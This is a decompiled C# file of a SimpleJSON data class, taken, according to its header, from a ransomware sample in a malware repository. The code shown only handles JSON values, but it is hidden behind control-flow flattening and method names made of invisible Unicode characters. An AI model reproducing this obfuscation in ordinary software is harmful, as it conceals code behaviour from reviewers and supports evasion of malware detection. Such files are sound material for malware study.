// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONData
// Assembly: AdjustmentRu, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 295D2DB0-E85F-4EE4-A4D8-BB22DC4EE57D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-56431be0898e907a3b97e42a4c9d74cbdb487ed8617dcf64fb3a8dddef6dded1.exe

using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONData : JSONNode
  {
    private string m_Data;

    public override string Value
    {
      get
      {
        string data = this.m_Data;
label_1:
        int num1 = -1958344768;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1146104692)) % 3U)
          {
            case 1:
              num1 = (int) num2 * 551894786 ^ -196697860;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return data;
      }
      set
      {
label_1:
        int num1 = 6203936;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2031364002)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.m_Data = value;
              num1 = (int) num2 * -477120711 ^ -1711465942;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public JSONData(string aData) => this.m_Data = aData;

    public JSONData(float aData) => this.AsFloat = aData;

    public JSONData(double aData)
    {
label_1:
      int num1 = -1184106022;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -46317058)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.AsDouble = aData;
            num1 = (int) num2 * 272301156 ^ 2110371678;
            continue;
          case 2:
            num1 = (int) num2 * 861149659 ^ 211431541;
            continue;
          case 3:
            goto label_3;
          case 4:
            num1 = (int) num2 * 1197244428 ^ 1412535095;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONData(bool aData)
    {
label_1:
      int num1 = -1242272679;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -998251852)) % 6U)
        {
          case 0:
            num1 = (int) num2 * 1183266608 ^ 1370280680;
            continue;
          case 1:
            num1 = (int) num2 * 1791298565 ^ 1249553573;
            continue;
          case 2:
            num1 = (int) num2 * -1681099997 ^ 1753239179;
            continue;
          case 3:
            goto label_3;
          case 4:
            this.AsBool = aData;
            num1 = (int) num2 * 1987952566 ^ -890137806;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public JSONData(int aData) => this.AsInt = aData;

    public override string ToString()
    {
label_1:
      int num1 = -1143222944;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -341299569)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str = JSONData.\u202D⁭⁪‏‫‭‪‪‬‬‭​⁮⁭‪⁮⁪‬‪‏‫⁮‎‬‎‏‫⁭⁮‭‮‪‪‍‫⁭‬‏⁮⁭‮("\"", JSONNode.Escape(this.m_Data), "\"");
            num1 = (int) num2 * -1715649257 ^ 1930503802;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 804815872;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1947399073)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = JSONData.\u202D⁭⁪‏‫‭‪‪‬‬‭​⁮⁭‪⁮⁪‬‪‏‫⁮‎‬‎‏‫⁭⁮‭‮‪‪‍‫⁭‬‏⁮⁭‮("\"", JSONNode.Escape(this.m_Data), "\"");
            num1 = (int) num2 * -1466930497 ^ -1723270204;
            continue;
          case 2:
            num1 = (int) num2 * -342012847 ^ 662485868;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override void Serialize(BinaryWriter aWriter)
    {
label_1:
      int num1 = 2103805196;
      JSONData jsonData;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1139802925)) % 32U)
        {
          case 0:
            int num3 = JSONData.\u206B‪‬‮⁪⁭‭⁮​‮⁬‌‮‬​‌‎​⁭‏⁭‎‬‏‫⁭‮⁫‬‪​‌​‮‪⁪‫⁮‫‮‮(jsonData.m_Data, this.m_Data) ? 92049279 : (num3 = 1071482360);
            num1 = num3 ^ (int) num2 * 730212510;
            continue;
          case 1:
            jsonData = new JSONData("");
            num1 = (int) num2 * -492217657 ^ -851990703;
            continue;
          case 2:
            JSONData.\u200C‪‬‍⁫‪⁫⁮‪⁮‌⁭⁬⁯⁫​‫⁪​‌​‏⁮‍⁫‬‎‭⁯⁮‭‌‮​⁯‍‎‮​⁭‮(aWriter, this.AsBool);
            num1 = (int) num2 * 1863119267 ^ -487275043;
            continue;
          case 3:
            num1 = (int) num2 * -1129740444 ^ -1485594958;
            continue;
          case 4:
            JSONData.\u206F⁭⁭⁮​​‎‏⁭‏⁮⁬‌‌⁯‌⁮‮⁭‪‬⁭‎‌‎​‫⁯‌⁯‮⁮‪⁬​​‎‭‌‎‮(aWriter, (byte) 3);
            num1 = 1456503250;
            continue;
          case 5:
            num1 = (int) num2 * 476198676 ^ 1459261923;
            continue;
          case 6:
            flag1 = JSONData.\u206B‪‬‮⁪⁭‭⁮​‮⁬‌‮‬​‌‎​⁭‏⁭‎‬‏‫⁭‮⁫‬‪​‌​‮‪⁪‫⁮‫‮‮(jsonData.m_Data, this.m_Data);
            num1 = (int) num2 * -1076530340 ^ 1693245521;
            continue;
          case 7:
            goto label_1;
          case 8:
            jsonData.AsDouble = this.AsDouble;
            num1 = 406109121;
            continue;
          case 9:
            jsonData.AsBool = this.AsBool;
            num1 = 1369933309;
            continue;
          case 10:
            JSONData.\u206F⁭⁭⁮​​‎‏⁭‏⁮⁬‌‌⁯‌⁮‮⁭‪‬⁭‎‌‎​‫⁯‌⁯‮⁮‪⁬​​‎‭‌‎‮(aWriter, (byte) 7);
            JSONData.\u200C⁮​‫‪‬‪⁮⁮⁫⁯⁮‎‏‪‏‎‭‭⁬‪⁫‭‬‍⁫‌‏‎‫‍‮​‍‬‎‌⁭​⁯‮(aWriter, this.AsFloat);
            num1 = (int) num2 * -1273047455 ^ 356390174;
            continue;
          case 11:
            int num4 = !JSONData.\u206B‪‬‮⁪⁭‭⁮​‮⁬‌‮‬​‌‎​⁭‏⁭‎‬‏‫⁭‮⁫‬‪​‌​‮‪⁪‫⁮‫‮‮(jsonData.m_Data, this.m_Data) ? -1285224987 : (num4 = -1102670776);
            num1 = num4 ^ (int) num2 * -1659416832;
            continue;
          case 12:
            num1 = (int) num2 * -1767946506 ^ 1806782911;
            continue;
          case 13:
            num1 = (int) num2 * 1700370381 ^ 1464630013;
            continue;
          case 14:
            num1 = (int) num2 * 924437124 ^ 714203657;
            continue;
          case 15:
            JSONData.\u206F⁭⁭⁮​​‎‏⁭‏⁮⁬‌‌⁯‌⁮‮⁭‪‬⁭‎‌‎​‫⁯‌⁯‮⁮‪⁬​​‎‭‌‎‮(aWriter, (byte) 6);
            num1 = (int) num2 * 591954335 ^ -1870602658;
            continue;
          case 16:
            num1 = (int) num2 * 701804266 ^ 38784395;
            continue;
          case 17:
            JSONData.\u206F⁭⁭⁮​​‎‏⁭‏⁮⁬‌‌⁯‌⁮‮⁭‪‬⁭‎‌‎​‫⁯‌⁯‮⁮‪⁬​​‎‭‌‎‮(aWriter, (byte) 5);
            num1 = (int) num2 * -1715926907 ^ 1922424485;
            continue;
          case 18:
            JSONData.\u206F⁭⁭⁮​​‎‏⁭‏⁮⁬‌‌⁯‌⁮‮⁭‪‬⁭‎‌‎​‫⁯‌⁯‮⁮‪⁬​​‎‭‌‎‮(aWriter, (byte) 4);
            num1 = (int) num2 * 1802174635 ^ -1440431608;
            continue;
          case 19:
            JSONData.\u200B‎‮⁬‬⁪‍‏⁫‬⁪⁭‫⁯‍‏⁬‭‫⁭⁪‮‫‫‏‏⁭⁮‬‍⁯‌‬⁬⁯​‌⁯⁫‪‮(aWriter, this.AsInt);
            num1 = (int) num2 * 303452420 ^ 1857318735;
            continue;
          case 20:
            int num5 = flag1 ? 1713488898 : (num5 = 1360502633);
            num1 = num5 ^ (int) num2 * -796129664;
            continue;
          case 21:
            jsonData.AsFloat = this.AsFloat;
            num1 = 1927153670;
            continue;
          case 22:
            num1 = (int) num2 * -1310398460 ^ 132361516;
            continue;
          case 23:
            JSONData.\u206E⁪‫⁯‮⁫‫⁫⁬‏⁭⁫⁭‮‭‎⁯⁯‏⁫​‬​⁭‫‍⁯⁮‫​‏‍⁭⁯‬‏‪⁭⁪‌‮(aWriter, this.AsDouble);
            num1 = (int) num2 * -256732732 ^ 1238168808;
            continue;
          case 24:
            int num6 = flag2 ? -79501260 : (num6 = -175396628);
            num1 = num6 ^ (int) num2 * 614416043;
            continue;
          case 25:
            goto label_3;
          case 26:
            flag2 = JSONData.\u206B‪‬‮⁪⁭‭⁮​‮⁬‌‮‬​‌‎​⁭‏⁭‎‬‏‫⁭‮⁫‬‪​‌​‮‪⁪‫⁮‫‮‮(jsonData.m_Data, this.m_Data);
            num1 = (int) num2 * -777055657 ^ 866415331;
            continue;
          case 27:
            jsonData.AsInt = this.AsInt;
            num1 = (int) num2 * -474535466 ^ 316921439;
            continue;
          case 28:
            num1 = (int) num2 * -546926376 ^ 1314786644;
            continue;
          case 29:
            num1 = (int) num2 * -633978563 ^ 1527000499;
            continue;
          case 30:
            JSONData.\u206C‭‬‫‪‪⁯‮‍⁭‭‫​​‌‎⁯‌⁯⁪⁫⁬‎⁪‮‪‪‪‍‭‎‏⁭‫⁭⁮‍⁪⁯⁪‮(aWriter, this.m_Data);
            num1 = (int) num2 * -802345900 ^ -1045782952;
            continue;
          case 31:
            num1 = (int) num2 * 147956541 ^ 1192739536;
            continue;
          default:
            goto label_34;
        }
      }
label_3:
      return;
label_34:;
    }

    static string \u202D⁭⁪‏‫‭‪‪‬‬‭​⁮⁭‪⁮⁪‬‪‏‫⁮‎‬‎‏‫⁭⁮‭‮‪‪‍‫⁭‬‏⁮⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static bool \u206B‪‬‮⁪⁭‭⁮​‮⁬‌‮‬​‌‎​⁭‏⁭‎‬‏‫⁭‮⁫‬‪​‌​‮‪⁪‫⁮‫‮‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static void \u206F⁭⁭⁮​​‎‏⁭‏⁮⁬‌‌⁯‌⁮‮⁭‪‬⁭‎‌‎​‫⁯‌⁯‮⁮‪⁬​​‎‭‌‎‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u200B‎‮⁬‬⁪‍‏⁫‬⁪⁭‫⁯‍‏⁬‭‫⁭⁪‮‫‫‏‏⁭⁮‬‍⁯‌‬⁬⁯​‌⁯⁫‪‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);

    static void \u200C⁮​‫‪‬‪⁮⁮⁫⁯⁮‎‏‪‏‎‭‭⁬‪⁫‭‬‍⁫‌‏‎‫‍‮​‍‬‎‌⁭​⁯‮([In] BinaryWriter obj0, [In] float obj1) => obj0.Write(obj1);

    static void \u206E⁪‫⁯‮⁫‫⁫⁬‏⁭⁫⁭‮‭‎⁯⁯‏⁫​‬​⁭‫‍⁯⁮‫​‏‍⁭⁯‬‏‪⁭⁪‌‮([In] BinaryWriter obj0, [In] double obj1) => obj0.Write(obj1);

    static void \u200C‪‬‍⁫‪⁫⁮‪⁮‌⁭⁬⁯⁫​‫⁪​‌​‏⁮‍⁫‬‎‭⁯⁮‭‌‮​⁯‍‎‮​⁭‮([In] BinaryWriter obj0, [In] bool obj1) => obj0.Write(obj1);

    static void \u206C‭‬‫‪‪⁯‮‍⁭‭‫​​‌‎⁯‌⁯⁪⁫⁬‎⁪‮‪‪‪‍‭‎‏⁭‫⁭⁮‍⁪⁯⁪‮([In] BinaryWriter obj0, [In] string obj1) => obj0.Write(obj1);
  }
}
